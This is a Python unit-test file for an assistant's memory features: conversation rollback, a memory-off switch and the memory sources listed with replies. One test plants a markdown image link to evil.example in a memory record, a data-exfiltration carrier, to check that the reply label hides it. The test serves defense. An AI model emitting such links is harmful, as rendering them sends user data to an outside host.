"""SEC2APP: per-conversation rollback (I23), the memory-off switch and
Remember refusal (I21) and the used-memory fields of a reply (I22). Every
database is a throwaway in TEMP; no model is called."""

from __future__ import annotations

import contextlib
import sqlite3
import unittest

from jarvis.contracts import (
    DataClassification,
    MemoryRecord,
    MemoryRecordActor,
    MemoryRecordKind,
    MemoryRecordOrigin,
    MemoryRecordScope,
    MemoryRecordStatus,
)
from jarvis.conversation import append_turn
from jarvis.memory import MemoryRecordApproval
from tests.helpers import isolated_settings, open_app


class Sec2AppTests(unittest.TestCase):
    def setUp(self) -> None:
        self.app = open_app(destination_policy=(), settings=isolated_settings(self))
        self.memory = self.app.memory
        self.project = self.memory.create_project("Alpha").id
        self.other = self.memory.create_project("Beta").id
        self.conversation = self.memory.create_conversation(self.project).id

    def turn(self, text: str) -> str:
        created = []

        def change(state):
            state, turn = append_turn(state, role="user", kind="user", text=text, message=text)
            created.append(turn)
            return state

        self.memory.update_conversation_state(self.conversation, change)
        return created[0].id

    def capture(self, text: str, kind=MemoryRecordKind.FACT, project=None, conversation=None, approve=True) -> str:
        record = MemoryRecord(
            kind=kind,
            text=text,
            subject_key=text.lower().replace(" ", "-")[:40],
            scope=MemoryRecordScope(project_id=project or self.project),
            origin=MemoryRecordOrigin.CAPTURE_SESSION_END,
            actor=MemoryRecordActor.TOOL,
            tool="memory_capture",
            confidence=0.9,
            classification=DataClassification.INTERNAL,
            source_conversation_id=conversation or self.conversation,
        )
        record_id = self.memory.insert_record(record).record.record_id
        if approve:
            self.memory.approve_record(record_id, MemoryRecordApproval(project_id=project or self.project,
                                                                       record_id=record_id))
        return record_id

    def statuses(self) -> dict[str, str]:
        return {view.record.record_id: view.status.value
                for view in self.memory.records_from_conversation(self.conversation, self.project)}

    # -- rollback (I23) --------------------------------------------------------

    def test_preview_counts_equal_the_rollback_counts_and_nothing_is_deleted(self) -> None:
        approved = [self.capture("deploys run on fridays"), self.capture("ci uses four shards")]
        self.memory.undo(approved[1], MemoryRecordActor.USER)   # terminal: skipped
        pending = self.capture("always squash merges", kind=MemoryRecordKind.DECISION, approve=False)
        kept = self.capture("beta stays separate", project=self.other)
        other_chat = self.capture("from another chat", conversation=self.memory.create_conversation(self.project).id)
        self.assertEqual("pending", self.memory.current_status(pending).value)

        preview = self.app.undo_conversation_records(self.conversation)
        self.assertEqual((True, False), (preview["ok"], preview["confirmed"]), preview)
        self.assertEqual({key: preview[key] for key in ("count", "approved", "pending", "skipped")},
                         {"count": 2, "approved": 1, "pending": 1, "skipped": 1})
        self.assertEqual("approved", self.memory.current_status(approved[0]).value)   # the preview wrote nothing

        done = self.app.undo_conversation_records(self.conversation, confirm=True)
        self.assertTrue(done["confirmed"], done)
        self.assertEqual({key: preview[key] for key in ("count", "approved", "pending", "skipped")},
                         {key: done[key] for key in ("count", "approved", "pending", "skipped")})
        self.assertEqual({approved[0]: "retracted", approved[1]: "retracted", pending: "rejected"}, self.statuses())
        self.assertEqual("approved", self.memory.current_status(kept).value)
        self.assertEqual("approved", self.memory.current_status(other_chat).value)
        with contextlib.closing(sqlite3.connect(self.memory.database_path)) as connection:
            self.assertEqual(5, connection.execute("SELECT COUNT(*) FROM memory_records").fetchone()[0])
        again = self.app.undo_conversation_records(self.conversation, confirm=True)
        self.assertEqual((0, 3), (again["count"], again["skipped"]))

    def test_foreign_project_and_global_conversations_are_refused(self) -> None:
        record_id = self.capture("deploys run on fridays")
        for conversation, project in ((self.conversation, self.other),
                                      (self.memory.create_conversation(None).id, None),
                                      ("no-such-conversation", None)):
            for confirm in (False, True):
                with self.subTest(conversation=conversation, project=project, confirm=confirm):
                    result = self.app.undo_conversation_records(conversation, project_id=project, confirm=confirm)
                    self.assertFalse(result["ok"], result)
        self.assertEqual(MemoryRecordStatus.APPROVED, self.memory.current_status(record_id))
        own = self.app.undo_conversation_records(self.conversation, project_id=self.project)
        self.assertEqual((True, 1), (own["ok"], own["count"]), own)

    # -- memory-off (I21) ------------------------------------------------------

    def test_memory_off_switch_round_trips_and_remember_stores_nothing(self) -> None:
        self.assertFalse(self.app.conversation_memory_off_payload(self.conversation)["conversation_memory_off"])
        message = self.turn("Deploys run on Fridays")
        switched = self.app.set_conversation_memory_off(self.conversation, True)
        self.assertEqual({"ok": True, "conversation_id": self.conversation, "conversation_memory_off": True}, switched)
        refused = self.app.remember_message(self.conversation, message)
        self.assertEqual((False, "memory_off"), (refused["ok"], refused.get("refused")), refused)
        self.assertEqual([], self.memory.records_from_conversation(self.conversation, self.project))
        self.assertEqual([], self.memory.list_records(MemoryRecordScope(self.project)))
        self.assertFalse(self.app.set_conversation_memory_off(self.conversation, "yes")["ok"])
        self.assertFalse(self.app.set_conversation_memory_off("no-such-conversation", True)["ok"])

        self.assertFalse(self.app.set_conversation_memory_off(self.conversation, False)["conversation_memory_off"])
        stored = self.app.remember_message(self.conversation, message)
        self.assertTrue(stored["ok"], stored)
        self.assertEqual(self.conversation, stored["record"]["source_conversation_id"])
        self.assertTrue(self.memory.was_ever_memory_off(self.conversation))

    # -- reply sources (I22) ---------------------------------------------------

    def test_reply_fields_list_record_kind_label_and_revision(self) -> None:
        fact = self.capture("deploys run on fridays")
        rule = self.capture("never force push main", kind=MemoryRecordKind.RULE)
        self.assertEqual(2, self.memory.record_revision(fact))   # created, approved
        self.memory.record_reply_sources(self.conversation, "t1", [
            (fact, MemoryRecordKind.FACT, self.memory.record_revision(fact)),
            (rule, MemoryRecordKind.RULE, 2),
        ])
        self.memory.record_reply_sources(self.conversation, "t2", [])
        self.assertEqual(
            {"usedMemory": [
                {"record_id": fact, "kind": "fact", "label": "deploys run on fridays", "revision": 2},
                {"record_id": rule, "kind": "rule", "label": "never force push main", "revision": 2},
            ], "memoryNoneRelevant": False},
            self.app.reply_memory_sources(self.conversation, "t1"))
        self.assertEqual({"usedMemory": [], "memoryNoneRelevant": True},
                         self.app.reply_memory_sources(self.conversation, "t2"))
        self.assertEqual({"usedMemory": [], "memoryNoneRelevant": False},
                         self.app.reply_memory_sources(self.conversation, "t3"))
        # Rolled back since: the reply still lists it, by kind only.
        self.app.undo_conversation_records(self.conversation, confirm=True)
        self.assertEqual(["fact", "rule"],
                         [item["label"] for item in self.app.reply_memory_sources(self.conversation, "t1")["usedMemory"]])

    def test_carrier_or_long_label_is_cut_or_shown_as_its_kind(self) -> None:
        carrier = self.capture("deploy notes are kept in the wiki")
        long = self.capture("word " * 40)
        # A carrier that reached the table past the write-time filter.
        with contextlib.closing(sqlite3.connect(self.memory.database_path)) as connection:
            connection.execute("UPDATE memory_records SET text = ? WHERE record_id = ?",
                               ("see ![x](https://evil.example/c?d=1) now", carrier))
            connection.commit()
        self.memory.record_reply_sources(self.conversation, "t1", [
            (carrier, MemoryRecordKind.FACT, 1), (long, MemoryRecordKind.FACT, 1)])
        used = self.app.reply_memory_sources(self.conversation, "t1")["usedMemory"]
        self.assertEqual("fact", used[0]["label"])
        self.assertEqual(60, len(used[1]["label"]))
        self.assertTrue(used[1]["label"].endswith("…"))

    def test_a_record_of_another_project_is_labelled_by_kind_only(self) -> None:
        foreign = self.capture("beta launch date is march", project=self.other,
                               conversation=self.memory.create_conversation(self.other).id)
        own = self.capture("deploys run on fridays")
        self.memory.record_reply_sources(self.conversation, "t1", [
            (foreign, MemoryRecordKind.FACT, 2), (own, MemoryRecordKind.FACT, 2)])
        used = self.app.reply_memory_sources(self.conversation, "t1")["usedMemory"]
        self.assertEqual(["fact", "deploys run on fridays"], [item["label"] for item in used])
        self.assertEqual([foreign, own], [item["record_id"] for item in used])


if __name__ == "__main__":
    unittest.main()
